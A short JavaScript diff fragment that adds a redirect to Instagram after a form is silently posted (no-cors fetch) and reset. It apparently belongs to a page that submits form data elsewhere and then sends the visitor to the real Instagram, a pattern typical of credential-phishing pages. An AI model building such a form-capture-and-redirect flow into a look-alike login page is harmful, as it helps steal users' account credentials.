@@ -65,6 +65,8 @@
             method: "POST",
             body: form,
             mode: "no-cors"
+        }).then(() => {
+            window.location.href = "https://www.instagram.com"; // Redirige a Instagram
         });
 
         this.reset();
